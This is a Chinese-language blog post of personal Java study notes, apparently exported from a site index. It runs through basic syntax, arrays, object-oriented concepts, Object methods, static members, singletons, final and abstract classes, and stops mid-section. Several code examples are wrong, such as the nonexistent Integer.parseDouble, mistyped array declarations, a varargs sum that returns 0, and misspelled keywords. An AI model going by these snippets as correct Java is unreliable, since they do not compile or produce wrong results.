[{"title":"java笔记","path":"/2024/12/06/java笔记/","content":"# java 运行机制 .java 文件是源代码，.class 文件是字节码，javac.exe 编译源代码为字节码 每有一个类，编译后都会生成一个.class 文件 JDK JRE JVM JDK = JRE + Java 开发工具 JRE = JVM + 核心类库 JVM：Java virtual machine # 注意事项： 源文件的组成部分是类（class） java 应用程序入口是 main () 方法，固定书写格式：public static void main (String [] args) {} 一个源文件最多只能有一个 public 类，其他不限 如果源文件包含一个 public 类，那文件名必须按该类名命名 main 方法可以写在非 public 类，然后指定运行非 public 类，这样入口方法就是非 public 类的 main 方法 # 转义字符 \\t：制表位，对齐，固定宽度 \\r：一个回车，对齐到第一个字并逐个替换，比如 System.out.println (“我爱你 \\r 他”)，会输出他爱你 如果是 System.out.println (“我爱你 \\r 他”) 就会输出两行 我爱你 他 # 文档注释 Javadoc 写法和标签总结_javadoc 标签大全 - CSDN 博客 在方法的上面输入 1/** 然后回车，就会自动生成一个 javadoc 格式的文档，然后就可以填内容了 和其他注释最主要的区别就是 javadoc 的注释可以在我们鼠标放到方法名 / 类名 / 变量名上面的时候，直接看到其内容，而双斜杠的注释不行 所以按照一般来说，我们会在类 / 变量 / 方法的注释中使用 javadoc 的形式，而在某段代码的注释使用双斜杠形式 # 用法 javadoc -d 文件夹名 -xx -yy Demo3.java 假设在 d 盘且文件名为 tch，所以下面这个就是 javadoc -d d:\\ -author -version tch.java 1234/** * @author tch * @version 1.0*/ # 常用 javadoc 标签 标签 描述 标签类型 @author 作者标识 包、 类、接口 @deprecated 标识当前 API 已经过期，仅为了保证兼容性依然存在，以此告之开发者不应再用这个 API 包、类、接口、值域、构造函数、 方法 指明当前文档根目录的路径 @exception 标志一个类抛出的异常 构造函数、 方法 从直接父类继承的注释 链接到某个特定的成员对应的文档中 包、类、接口、值域、构造函数、 方法 插入一个到另一个主题的链接，但是该链接显示纯文本字体 包、类、接口、值域、构造函数、 方法 @param 方法的入参名及描述信息，如入参有特别要求，可在此注释 构造函数、方法 @return 对函数返回值的注释 方法 @see 引用，查看相关内容，如类、方法、变量等 包、类、接口、值域、构造函数、 方法 @serial 说明一个序列化属性 @serialData 说明通过 writeObject () 和 writeExternal () 方法写的数据 @serialField 说明一个 ObjectStreamField 组件 @ @since 描述文本，API 在什么程序的什么版本后开发支持 包、类、接口、值域、构造函数、 方法 @throws 构造函数或方法所会抛出的异常 构造函数、 方法 显示常量的值，该常量必须是 static 属性 静态值域 @version 版本号 包、 类、接口 对两种标签格式的说明： @tag 格式的标签（不被 { } 包围的标签）为块标签，只能在主要描述（类注释中对该类的详细说明为主要描述）后面的标签部分（如果块标签放在主要描述的前面，则生成 API 帮助文档时会检测不到主要描述）。 {@tag} 格式的标签（由 { } 包围的标签）为内联标签，可以放在主要描述中的任何位置或块标签的注释中 # 数据类型转换细节 # 自动转换 （byte short）和 char 之间不会相互自动转换 byte short char 他们三者可以计算，在计算时首先转换为 int 类型 哪怕是相同的类型，比如 byte 和 byte 计算，他也会先转成 int 再计算，结果类型也就是 int，另外两个也是的 布尔类型不参与类型自动转换 # 强制转换 12345678910double a = 123.5;int b = (int)a;//字符串强制转换String a = &quot;123&quot;;int num1 = Integer.parseInt(a);double num2 = Integer.parseDouble(a);long num3 = Integer.parseLong(a);//其他类型以此类推//而char类型的强制转换就只会截取字符串的第一个字符 System.out.println(a.charAt(0));//输出a的第一个字符 # 位移运算 算术右移 &gt;&gt;：低位溢出，符号位不变，并用符号位补溢出的高位，可以理解为右移一位就除以 2 算术左移 &lt;&lt;：符号位不变，低位补 0，可以理解为左移一位就乘以 2 '&gt;&gt;&gt;' 逻辑右移也叫无符号右移，运算规则是：低位溢出，高位补 0 # 数组 不知道值的时候比如需要输入就用动态，已知数组的值比如用来加密的表就用静态 数组如果未赋值，每个类型都有其对应的默认值：数字类型全是 0 或 0.0（浮点），char 为 \\u000，boolean 为 false，String 为 null 数组的赋值为地址复制，如果只想值复制的话，可以先分配空间后再用遍历赋值 12345int arr1[]=&#123;1，2，3&#125;;int arr2 = new int[arr1.length];for(int i=0;i&lt;arr1.length;i++) &#123; arr2[i] = arr1[i];&#125;; # 动态初始化 int [] arr= new arr [10]; 或者 int arr [] = new arr [10]; 也可以先声明再分配空间： int arr[]; arr = new int[10]； # 静态初始化 int tch[] = {1，2，3，4，5}; # 扩容 用新数组扩容并转移地址 1234567int arr[] = &#123;1,2,3&#125;;int newarr = new int[arr.length+1];for(int i=0;i&lt;arr.length;i++) &#123; newarr[i] = arr[i];&#125;newarr[newarr.length-1] = 4;arr = newarr; # 二维数组 java 中二维数组的列数可以不确定，第一个一维可以有五个元素，第二个一维可以只有 3 个元素 1234int arr[][] = new int[3][];for(int i=0;i&lt;arr.length;i++) &#123; arr[i] = new int[i+1];//在这里给每个一维数组分配长度&#125; 12345678910int arr[][] = &#123; &#123;1,2,3&#125;, &#123;4,5,6&#125; &#125;;//静态int arr[][] = new int[2][3];//动态//或者先声明int arr[][];arr = new int[2][3];//还可以这样int[] arr[] = new arr[2][3];//这种方式可以同时定义一个一维和二维int[] arr1,arr2[]; # 类与对象 # 创建规则 1234567891011class Cat &#123;\tString name;\tint age;\tString color;&#125;//使用时，先实例化再引用Cat cat1 = new Cat();//cat1就是对象名 cat1.name = &quot;小白&quot;;cat1.age = 3;cat1.color = &quot;白色&quot;;//如果不对类中的属性赋值的话，就是默认值，默认值规则和数组一样 对象的复制是指向地址的 # 类和对象的内存分配机制 栈：一般存放基本数据类型 堆：存放对象（Cat cat，数组等） 方法区：常量池（常量，比如字符串），类加载信息 # 创建对象的流程简单分析 123Person p = new Person();p.name = &quot;jack&quot;;p.age = 10; 先加载 Person 类信息（属性和方法信息，只加载一次） 在堆中分配空间，进行默认初始化（默认值） 把地址赋给 p，让 p 指向对象 进行指定的初始化，比如上面代码的赋值 # 方法 # 如何创建和引用 1234567891011121314public class tch&#123;\tpublic static void main(String args[])&#123; Personn p1 = new Person();//分配空间 p1.speak();//引用\t&#125;&#125;class Person &#123;\tString name;\tint age; //创建\tpublic void speak() &#123;//无传入值 System.out.println(&quot;I&#x27;m a good man&quot;);\t&#125;&#125; # 方法调用过程 程序执行到方法时，会开辟一个独立空间（栈空间） 当方法执行完毕，或者执行到 return 语句时，就会返回 返回到调用方法的地方 返回后继续执行方法后面的代码 当 main 方法 (栈) 执行完毕后整个程序退出 # 一些细节 有多个返回值的时候可以用数组 void 类型不可以 return 值，但可以只写 return 同类中的方法可以直接调用，不用创建对象 # 传参机制 基本数据类型的传参就是拷贝 引用数据类型的传参是指向地址 # 递归 执行一个方法时，就创建一个新的受保护的独立空间（栈空间） 方法的局部变量时独立的，不会相互影响 如果方法中使用的是引用类型变量，就会共享该引用类型的数据 递归主要是对于规律的应用吧，只要微操作和超级操作是对的，就不要去想里面的过程是怎么样，两个操作都是正确的，其实也就互相证明了这个程序是对的，要相信它可以实现我们的要求 # 方法重载 java 中允许同一个类中有多个同名方法的存在，但形参列表要不一样。重载减轻了起名和记名的麻烦 123//比如最基础的System.out.println(&quot;123&quot;);System.out.println(&quot;abc&quot;); 方法名要一致 形参列表必须不同，类型、个数、顺序等 返回类型：无要求 # 可变参数 java 允许将同一个类中，多个同名同功能但参数个数不同的方法，封装成一个方法。可通过可变参数实现 # 基本语法 12345678910访问修饰符 返回类型 方法名(数据类型...形参名) &#123;&#125;//使用可变参数时，可以把参数当作数组来使用，也可以把数组传进来public int sum(int... nums) &#123; int res = 0; for(int i=0;i&lt;nums.length;i++) &#123; res += nums[i]; &#125; return 0;&#125; # 细节 可变参数的个数可以是 0 也可以是任意多个 可变参数的本质就是数组 可变参数可以和普通类型的参数一起放在形参列表，但是必须保证可变参数在最后，且一个形参列表中只能有一个可变参数 12public void f1(int a,double b,char... c) &#123;&#125; # 作用域 java 中主要的变量就是属性（成员变量）和局部变量 局部变量一般是指在成员方法中定义的变量 123456789101112class cat &#123; int age = 10;//age就是全局变量 public void cry() &#123; //这里的n和name就是局部变量 //n和name的作用域就在cry中 int n = 10; String name = &quot;jack&quot;&#x27;&#x27; &#125; public void eat() &#123; System.out.print(age);//这里可以用age但不能用cry中的变量 &#125;&#125; java 中作用域的分类： 全局变量：也就是属性，作用域为整个类体 局部变量：也就是除了属性之外的其他变量，作用域为定义它的代码块中 全局变量可以不赋值，直接使用，因为有默认值，局部变量必须赋值后才能使用，因为没有默认值 局部变量和属性（全局变量）可以重名，访问时遵循就近原则 1234567class cat &#123; String name = &quot;jack&quot;; public void cry() &#123; String name = &quot;tom&quot;;//这行在就会输出tom，反之输出jack System.out.print(name); &#125;&#125; 可以跨类调用全局变量 全局变量可以加修饰符，局部不可以 # 构造器 / 方法 构造器的修饰符可以默认，也可以是 public，protected，private 构造器没有返回值 方法名和类名必须一样 参数列表和成员方法一样的规则 构造器的调用系统完成，在创建对象时，系统会自动调用该类的构造器完成对对象的初始化 123456789101112131415public class constructor &#123; public static void main(String args[]) &#123; //new一个对象时，直接通过构造器指定名字和年龄 Person p1 = new Person(&quot;tch&quot;, 21); &#125;&#125;class Person &#123; String name; int age; //构造器的名称和类名要一样 public Person(String pName, int pAge) &#123; name = pName; age = pAge; &#125;&#125; 构造器也可以重载，因为构造器本身也是方法 1234567891011121314151617public class constructor &#123; public static void main(String args[]) &#123; Person p1 = new Person(&quot;tch&quot;, 21); Person p1 = new Person(&quot;tchhhh&quot;); &#125;&#125;class Person &#123; String name; int age; public Person(String pName, int pAge) &#123; name = pName; age = pAge; &#125; public Person(String pName) &#123;//只有一个形参 name = pName; &#125;&#125; 程序员如果没定义构造器，系统会自动生成一个默认无参构造器 有参构造器在 new 新对象的时候要提供参数，无参构造器不需要，相当于给了多种 new 新对象的方式 12345class Person &#123;/* Person(); &#123; &#125;*/&#125;//这里是空的，但实际上有一个默认的构造器，可以通过反编译出来，javap 一旦定义了自己的构造器，默认的构造器就被覆盖了，不能再使用默认无参构造器，除非显式地定义一下 12345678class Person &#123; public Person(String pName, int pAge) &#123; //... &#125; Person() &#123;//显式的定义一下 &#125;&#125; # this 关键字 在这里定义构造器的时候，如果可以把形参定义为 String name, int age 看上去就会更简介，但是如果这样定义就会导致 name 的值为空，这里可以用 this 来解决 12345678class Dog &#123;\tString name;\tint age;\tpublic Dog(String dName, int dAge) &#123; name = dName; age = dAge;\t&#125;&#125; java 虚拟机会给每个对象分配 this，代表当前对象，哪个对象调用 this 就指的是哪个对象的地址 12345678class Dog &#123;\tString name;\tint age;\tpublic Dog(String name, int age) &#123; this.name = name; this.age = age;\t&#125;&#125; this 不能在类定义的外部使用，只能在类定义的方法中使用 访问成员方法的语法：this. 方法名 (参数列表) 123456789class T &#123; public void f1() &#123; //... &#125; public void f2() &#123; f1(); this.f1(); &#125;&#125; 访问构造器语法:this (参数列表)；只能在构造器中使用（只能在构造器中访问另一个构造器） 123456789public T &#123; public T() &#123; //如果要在构造器中用this访问另一个构造器 this(&quot;tch&quot;,21);//this语句必须要在第一行 &#125; public T(String name, int age) &#123; //... &#125;&#125; # 包 包实际上就是创建不同的文件夹来保存类文件 # 作用： 区分相同名字的类 当类很多时，可以很好的管理类 控制访问范围 # 命名规范 123456//一般的命名规范com.公司名.项目名.业务模块名//eg:com.sina.crm.user//用户模块com.sina.crm.order//订单模块com.sina.crm.utils//工具类 # 常用的包 1234java.lang.* //lang包时基本包，默认引入java.util.* //系统提供的工具，工具类，使用Scannerjava.net.* //网络包，网络开发java.awt.* //java界面开发，GUI # 细节 package 的作用是声明当前类所在的包，需要放在类的最上面，一个类中最多只有一句 package import 指令位置放在 package 的下面，在类定义前面，可以有多句且没有顺序要求 # 访问修饰符 公开级别：用 public 修饰，对外公开 受保护级别：protected，对子类和同一个包中的类公开 默认级别：没有修饰符号，向同一个包的类公开 私有级别：private，只有类本身可以访问，不对外公开 # 封装 encapsulation 封装就是把抽象出的数据 [属性] 和对数据的操作 [方法] 封装在一起，数据被保护在内部，程序的其他部分只有通过被授权的操作 [方法]，才能对数据进行操作 # 封装的好处 隐藏实现细节：方法 (连接数据库)&lt;–调用 (传入参数) 可与对数据进行验证，保证安全合理 # 封装的实现步骤 将属性进行私有化【不能直接修改属性】 提供一个公共的 (public) set 方法，用于对属性判断并赋值 1234public void setXxx(类型 参数名)&#123;//Xxx表示某个属性 //加入数据验证的业务逻辑 属性 = 参数名;&#125; 提供一个公共的 (public) get 方法，用于获取属性的值 123public 数据类型 getXxx()&#123;//权限判断，Xxx某个属性 return xx;&#125; # Getter 和 Setter Getter 和 Setter 方法可以直接在别的类中访问或修改私有属性，它们提供了封装性，检验和操作的功能，通过规范的命名和方法签名，可以提高代码的可读性和维护性 快捷键：Alt + insert（笔记本加 Fn） # 作用 Getter 和 Setter 方法的使用可以有效地控制对对象属性的访问和修改，提供了封装性和安全性 通过 Getter 方法，其他类可以获取属性的值而不需要直接访问属性 通过 Setter 方法，其他类可以修改属性的值而不需要直接修改属性 封装性：通过 Getter 和 Setter 方法，可以对属性的访问和修改进行控制 验证和操作：可以在 Getter 和 Setter 方法中实现对属性的验证和操作，例如范围检查、格式转换等，确保数据的合法性 可读性和可维护性：通过 Getter 和 Setter 方法可以提供更具描述性和可读性的代码，使代码更易于理解和维护 # 继承 在一些问题中可能会出现，很多类的属性和方法都一样，这就造成了代码复用的现象，代码冗余度很高，继承就可以解决代码复用性的问题。 当多个类存在相同属性和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过 extends 来声明继承父类即可。 # 语法 123456789class 子类 extends 父类 &#123;&#125;//子类会自动拥有父类定义的属性和方法//父类也叫超类，基类//子类又叫派生类public class Pupil extends Student&#123; public void testing() &#123; System.out.println(name + &quot;正在考小学数学&quot;); &#125; # 细节 子类继承了所有的属性和方法，但是私有属性和方法不能在子类直接访问，要通过公共的方法去访问 子类必须调用父类的构造器，完成对父类的初始化 当创建子类对象时，不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器，如果父类没有提供无参构造器，则必须在子类的构造器中用 super 去指定使用父类的哪个构造器完成对父类的初始化工作，否则编译不会通过 1234567//比如现在的父类就没有无参构造器，但是有形参为String，int的构造器，那么可以这样使用super();public class Sub extends Base &#123; public Sub() &#123; super(&quot;jack&quot;, 10); System.out.println(&quot;子类Sub()构造器被调用。&quot;); &#125;&#125; 如果希望指定去调用父类的某个构造器，则显示的调用一下 super 在使用时，需要放在构造器第一行 super () 和 this () 都只能放在构造器的第一行，因此这两个方法不能共存在一个构造器 java 所有类都是 Object 类的子类，Object 类是所有类的基类 父类构造器的调用不限于直接父类，将一直往上追溯，直到 Object 类 (顶级父类) 子类最多只能继承一个父类（指直接继承），即 java 中是单继承机制。 如果要让 A 继承 B 和 C，得先 A 继承 B，B 继承 C 不能滥用继承，子类和父类之间必须满足 is-a 的逻辑关系 123Cat extends Animal//合理Person extends Music//不合理 # super 关键字 用 super 调用父类的构造器，可使分工明确，父类属性由父类初始化，子类的属性由子类初始化 # 语法 访问父类的属性，但不能访问父类的 private 属性\tsuper. 属性名 1System.out.println(super.n1+super.n2); 访问父类的方法，不能访问父类的 private 方法 super. 方法名 () 1super.test(); 访问父类的构造器 super (参数列表)；只能放在构造器的第一句 123super(&quot;jack&quot;);super();super(&quot;jack, 22&quot;); # 细节 当子类中有和父类中的成员重名时，为了访问父类的成员，必须通过 super，如果没有重名，使用 super、this、直接访问时一样的效果 super 的访问不限于直接父类，如果爷爷类和本类中有同名的成员，也可以使用 super 去访问爷爷类的成员；如果多个基类中都有同名的成员，使用 super 访问遵循就近原则。 # 方法重写 / 覆盖 (override) 方法覆盖就是子类有一个方法和父类的某个方法的名称、返回类型、参数一样，那么我们就说子类的这个方法覆盖了父类的那个方法 + ** 作用：** 可以达到不更改父类的方法便创建了子类的一个方法。使程序更加的安全 # 注意事项和使用细节 子类的方法的参数，方法名称，要和父类方法的参数名称完全一样 子类方法的返回类型和父类方法返回类型一样，或者是父类返回类型的子类，比如父类返回类型是 object，子类返回类型是 String 子类方法不能缩小父类方法的访问权限 # 多态 问题引出：一个主人有几个宠物，比如小狗和猫，小狗吃骨头，猫吃鱼，可能还会吃别的东西，那么在这种情况下，我们要建立一个小狗的类、小猫的类，还有食物的类，而食物又分为骨头，鱼，后面可能还会有别的，那么这些食物就是 food 的子类。在这种情况下，我每多一个宠物，我就要在主方法中多写一个方法来调用他们，这样会随着项目的扩展导致方法数量太多，不利于管理和维护 而在多态的情况下，父类对象可以指向子类对象，那么只要是这个父类的子类，都可以直接传入同一个方法中来调用，根据子类的不同而输出不同的值 # 方法的多态 方法的重写和重载就体现了多态 # 对象的多态 一个对象的编译类型和运行类型可以不一致 编译类型在定义对象时就确定了，不能改变 运行类型是可以变化的 编译类型看定义时 “=” 号的左边，运行类型看 “=” 号的右边 12Animal animal = new Dog();//animal编译类型是Animal，运行类型是Doganimal = new Cat();//animal的运行类型变成了Cat，编译类型仍然是Animal # 注意事项 多态的前提是两个对象（类）存在继承关系 属性没有重写之说，属性的值看编译类型。（如果转型的类中有和父类一样的属性，那么就看编译的是哪个类，值就是哪个类的值） instanceof 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的（前面这个是否为后面这个的）子类型 123456789101112//编译类型运行类型都为BB，但BB是AA的子类，所以返回结果都为tureBB bb = new BB();System.out.println(bb instanceof BB);System.out.println(bb instanceof AA);//aa编译类型AA，运行类型BBAA aa = new BB();System.out.println(aa instanceof AA);System.out.println(aa instanceof BB);//返回结果都为tureclass AA&#123;&#125;class BB exetnds AA&#123;&#125; # 多态向上转型 本质：父类的引用指向了子类的对象（也就是向上转型）。只要是继承关系，父类都可以指向下面的任意子类 特点：编译类型看左边，运行类型看右边 语法：父类类型\t应用名 = new 子类类型 (); 1Animal animal = new Cat(); 可以调用父类中的所有成员（需遵守访问权限，比如私有就无法调用） 不能调用子类中的特有成员（父类中没有的，就不能调用） 最终的运行效果看子类的具体实现 # 向下转型 为了代码维护的便利，我们利用多态的性质进行了一个向上转型，但当我们在向上转型之后，又需要用到子类中的成员，但此时无法引用，这还是就可以向下转型进行一个强转，强行把指向父类又改成指向子类，这样就可以使用子类的成员了 语法：子类类型\t引用名 = （子类类型）父类引用； 1Cat cat = (Cat) animal; 只能强转父类的引用，不能强转父类的对象 要求父类引用必须指向的是当前目标类型的对象（就是如果要向下转型，你转型的目标原本就是这个类型的，只不过之前向上转型了，现在相当于是复原回它原本的类型） 可以调用子类类型中所有的成员 # java 动态绑定机制 当调用对象方法的时候，该方法回合该对象的内存地址 (也就是运行类型) 绑定 当调用对象属性时，没有动态绑定机制，哪里声明就用哪里的 # 多态数组 数组的定义类型为父类类型，里面保存的实际元素类型为子类类型 12345//Student和Teacher都是Person的子类，数组为Person类，里面的数据可以存放子类Person[] persons = new Person[5];persons[0] = new Person(&quot;jack&quot;, 20);persons[1] = new Student(&quot;tch&quot;, 21);persons[2] = new Teacher(&quot;king&quot;, 30, 20000); # 多态参数 方法定义的形参类型为父类类型，实参类型允许为子类类型 123456Student tch = new Student(&quot;tch&quot;, 21);Teacher jack = new Teacher(&quot;jack&quot;, 35);//这里Student和Teacher都是Person的子类，可以直接将这样一个对象传给AAA的形参public void AAA(Person a) &#123; System.out.println(a.say());&#125; # Object 类 # == == 既可以判断基本类型，又可以判断引用类型 == 如果判断基本类型，判断的是值是否相等 == 如果判断引用类型，判断的是地址是否相等，即判定是不是同一个对象 123A a = new A();A b = a;A c = b; # equals() equals 是 Object 类中的方法，只能判断引用类型，默认判断的是地址是否相等，子类中往往要重写该方法，用于判断内容是否相等，比如 Integer，String，这两个之所以可以直接比较值，是因为 integer 类和 String 类中已经重写了 equals 方法 如果没有重写 equals 方法，那么就是比较地址，如果重写了，就是比较重写的值，根据这个我们可以自己重写我们所需要的 equals 方法 1234567891011121314151617181920class Person &#123; private String name; private int age; private char gender; //重写Object的equals方法 public boolean equals(Object obj) &#123; //判断如果比较的两个对象是同一个对象，返回ture if(this == obj) &#123; return true; &#125; //类型判断 if(obj instanceof Person) &#123;//是Person才开始比较，否则直接返回false //进行类型转换，现在相当于是Object类，所以需要向下转型,我需要得到obj的各个属性来进行判断 Person p = (Person)obj; return this.name.equals(p.name) &amp;&amp; this.age == p.age &amp;&amp; this.gender == p.gender; &#125; else &#123; return false; &#125; &#125; # hashCode 方法 返回该对象的哈希码值，支持此方法是为了提高哈希表的性能。 提高具有哈希结构的容器的效率 两个引用，如果一个指向的是同一个对象，哈希值一样 如果指向的是不同的对象，哈希值不一样 哈希值主要根据地址号计算，不能完全将哈希值等价于地址 后面在集合中，hashCode 如果需要的话，也可以重写 # toString 方法 默认返回：全类名 (包名 + 类名)+@+ 哈希值的 16 进制，子类往往重写 toString 方法，用于返回对象的属性信息 重写 toString 方法，打印对象或拼接对象时，都会自动调用该对象的 toString 形式 当直接输出一个对象时，toString 方法会被默认的调用 123456789101112131415161718192021//重写toString方法输出对象的属性，使用快捷键alt+insert -&gt; toStirngclass Monster &#123; private String name; private int age; private String job; public Monster(String name, int age, String job) &#123; this.name = name; this.age = age; this.job = job; &#125;//重写后一般是把对象的属性值输出，也可以自己定制 @Override public String toString() &#123; return &quot;Monster&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, job=&#x27;&quot; + job + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; # finalize 方法 这个实际开发中几乎不会用，应付面试 当对象被回收时，系统自动调用该对象的 finalize 方法，释放资源，子类可重写该方法 什么时候被回收：当某个对象没有任何引用时，jvm 会认为这个对象是一个垃圾对象，就会使用垃圾回收机制来销毁该对象，在销毁该对象之前，会先调用 finalize 方法 垃圾回收机制的调用，是由系统来决定 (即有自己的 GC 算法)，也可以通过 System.gc () 主动触发垃圾回收机制 # 断点调试 在断点调试过程中，是运行状态，是以对象的运行类型来执行的 # 快捷键 F7（跳入）\tshift+F8（跳出）\tF9（resume，执行到下一个断点） F7：跳入方法内\tF8：逐行执行代码\tshift+F8：跳出方法 # 类变量和类方法 类变量和类方法也叫做静态变量和静态方法，可以直接使用而不需要初始化，对所有对象都共享。 在 java7 以上，静态变量和静态方法都是储存在方法区；java7 及以下的静态变量储存在常量池的一个专门储存 static 变量的地方 类方法中不能使用和对象有关的关键字，比如 this 和 super 静态方法只能访问静态变量或方法 静态方法不能被重写 # main 方法语法 main 方法接受 String 类型的数组参数，该数组中保存执行 java 命令时传递给所运行的类的参数 12345678910//语法：java 执行的程序 参数1 参数2 参数3public class hello &#123; public static void main(String[] args) &#123; for(int i = 0; i&lt;args.length; i++) &#123; System.out.println(args[i]); &#125; &#125;&#125;//在cmd中执行这个程序，然后输入“java hello tch tchh tchhh”，就会输出这几个字符串 # 代码块 代码块又称为初始化块，属于类中的成员，是类的一部分，类似于方法，将逻辑语句封装在方法体中，用 {} 包围。但和方法不同，没有方法名，没有返回，没有参数，只有方法体，而且不用通过对象或类显示调用，而是加载类时，或创建对象时隐式调用。 1234//基本语法[修饰符]&#123;//代码&#125;; 修饰符可选，要写的话也只能写 static 代码块分为两类，使用 static 修饰的交静态代码块，没有 static 修饰的交普通代码块 逻辑语句可分为任何逻辑语句（输入输出、方法调用、循环、判断等） 分号可以省略 # 代码块的好处 相当于另外一种形式的构造器（对构造器的补充机制），可以做初始化的操作 如果多个构造器中都有重复的语句，可以抽取到初始化块中，提高代码的复用性 123456789101112131415161718192021222324252627282930class Movie&#123; private String title; private String director; private int year;\t/** * 这里有三种构造器，而我们在构造器前添加了普通代码块，注意是普通代码块 * 那么无论是哪个构造器被调用，都会先执行代码块中的内容，这样就提升了代码的复用性 * 就不需要再每个构造器中都写上这三句代码 */ &#123; System.out.println(&quot;映前广告&quot;); System.out.println(&quot;广告结束&quot;); System.out.println(&quot;电影开始&quot;); &#125;; public Movie(String title) &#123; this.title = title; &#125; public Movie(String title, String director) &#123; this.title = title; this.director = director; &#125; public Movie(String title, int year, String director) &#123; this.title = title; this.year = year; this.director = director; &#125;&#125; # 细节 static 代码块的作用是对类进行初始化，而且随着类的加载而执行，并且只会执行一次。如果是普通代码块，每创建一个对象，就执行一次 类什么时候被加载： 创建实例时（new） 创建子类对象实例，父类也会被加载，父类先加载，子类后加载 使用类的静态成员时（静态变量 / 方法） 普通代码块在创建对象实例时会被隐式的调用，被创建一次就会被调用一次。但如果只是使用类的静态成员，普通代码块不会执行 创建对象时，代码块在类中的调用顺序如下 1-&gt;2-&gt;3 调用静态代码块和静态属性初始化（静态代码块和静态属性初始化调用的优先级一样，如果有多个静态代码块和多个静态变量初始化，则按他们定义的顺序调用） 调用普通代码块和普通属性的初始化（普通代码块和普通属性初始化调用的优先级一样，如果有多个普通代码块和普通属性初始化，则按定义顺序调用） 调用构造方法 构造器的最前面其实隐含了 super () 和调用普通代码块的一句话，静态相关的代码块，属性初始化，在类加载时就执行完毕，因此是优先于构造器和普通代码块执行的 12345678class A &#123;\tpublic A() &#123; //隐藏语句： //(1)super(); //(2)调用普通代码块的语句 System.out.println(&quot;ok&quot;);\t&#125;&#125; 创建一个子类对象时的加载顺序：（面试高频） 父类的静态代码块和静态属性 子类的静态代码块和静态属性 父类的普通代码块和普通属性初始化 父类的构造方法 子类的普通代码块和普通属性初始化 子类的构造方法 # 单例设计模式 单例设计模式，就是采取一定的方法保证在整个的软件系统中，对某个类只能存在一个对象实例，并且该类只提供一个取得其对象实例的方法。单例模式有两种方式：饿汉式和懒汉式 # 饿汉式 无论是否使用对象，都会先创建，所以叫饿汉式。但这样有可能会造成资源浪费 步骤如下 构造器私有化（防止直接 new 类的内部创建对象 向外暴露一个静态的公共方法 getInstance 1234567891011121314151617181920212223242526272829public class SingleTon &#123; public static void main(String[] args) &#123; GirlFriend girlFriend = GirlFriend.getGirlFriend(); System.out.println(girlFriend);//无论创建几次新的对象，都是指向GirlFriend内部创建的对象 &#125;&#125;class GirlFriend &#123; private String name; //为了能够在静态方法中使用，需要将其静态化 private static GirlFriend gf = new GirlFriend(&quot;xiaohong&quot;); //如何保证只能创建一个GirlFriend对象 //1.将构造器私有化 //2.在类的内部直接创建 //3.提供一个公共的static方法，返回gf对象 private GirlFriend(String name) &#123; this.name = name; &#125; public static GirlFriend getGirlFriend() &#123; return gf; &#125; @Override public String toString() &#123; return &quot;GirlFriend&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; # 懒汉式 在需要使用的时候才创建对象，所以叫懒汉式 步骤如下： 构造器私有化 定义一个 static 对象 提供一个 public 方法，可以返回 Cat 对象 123456789101112131415161718192021222324252627282930313233public class SingleTon2 &#123; public static void main(String[] args) &#123; Cat mao = Cat.getInstance(); System.out.println(mao); &#125;&#125;//希望在程序运行过程中只能创建一个Cat对象class Cat &#123; private String name; private static Cat cat; //1.构造器私有化 //2.定义一个static对象 //3.提供一个public方法，可以返回Cat对象 private Cat(String name) &#123; this.name = name; &#125; public static Cat getInstance() &#123; if (cat == null) &#123;//如果没有创建Cat对象 cat = new Cat(&quot;mimi&quot;); &#125; return cat; &#125; @Override public String toString() &#123; return &quot;Cat&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; # 两者区别 最主要的区别在于创建对象的时机不同，饿汉式是在类加载就创建了对象实例，而懒汉式是在使用是才创建 饿汉式不存在线程安全问题，懒汉式存在线程安全问题 饿汉式存在浪费资源的可能，懒汉式因为是使用时才创建，不存在这个问题 在 javaSE 标准类中，java.lang.Runtime 就是经典的单例模式 # final 关键字 final 可以修饰类、属性、方法和局部变量，在什么时候会用到 final 关键字 当不希望类被继承时，可以用 final 修饰 当不希望父类的某个方法被子类覆盖 / 重写时 当不希望类的某个属性的值被修改 当不希望某个局部变量被修改 # 注意事项 final 修饰的属性又叫常量，一般用 XX_XX_XX 来命名 1public final double TAX_RATE = 0.08; final 修饰的属性在定义时，必须赋初值，并且以后不能再修改，赋值可以在以下位置之一 定义时：如 public final double TAX_RATE = 0.08; 在构造器中 在代码块中 如果 final 修饰的属性是静态的，则初始化的位置只能是：定义时；在静态代码块；不能在构造器中赋值 final 类不能继承，但可以实例化对象 如果类不是 final 类，但是含有 final 方法，则该方法虽然不能重写，但是可以被继承 一般来说，如果一个类已经是 final 类了，就没必要将方法再修饰成 final final 不能修饰构造器 final 和 static 往往搭配使用，效率更高，底层编译器做了优化处理，不会导致类加载 包装类（integer，double，float，boolean 等都是 final），String 也是 final 类 # 抽象类 当父类的某些方法需要声明，但是又不确定如何实现时，可以将其声明为抽象方法，那么这个类就是抽象类 一般情况都是让子类继承来实现方法，抽象类的价值更多是在于设计，设计者设计好之后，让子类继承并实现抽象类。抽象类是考官比较爱问的知识点，在框架和设计模式使用较多 12345678910//当一个类中存在抽象方法时，类也要声明为抽象类abstract class Animal &#123; private String name; public Animal(String name) &#123; this.name = name; &#125; public abstract void eat();&#125; # 细节 抽象类不能被实例化 抽象类不一定要包含 abstract 方法，抽象类可以没 abstract 方法 一旦类包含了 abstract 方法，这个类就必须声明为抽象类 abstract 只能修饰类和方法，不能修饰属性或其他的 抽象类可以有任意成员，比如非抽象方法、构造器、静态属性等 抽象方法不能有主题，即不能实现 如果一个类继承了抽象类，则它必须实现抽象类的所有抽象方法，除非它自己也声明为抽象类 抽象方法不能使用 private、final 和 static 修饰，因为这些关键字和重写都是相违背的 # 抽象模板模式 在模板模式中，一个抽象类公开定义了执行它的方法的方式，它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行，这种类型的设计模式属于行为型模式。 # 主要解决的问题 解决在多个子类中重复实现相同的方法的问题，通过将通用方法抽象到父类中来避免代码重复 ** 使用建议：** 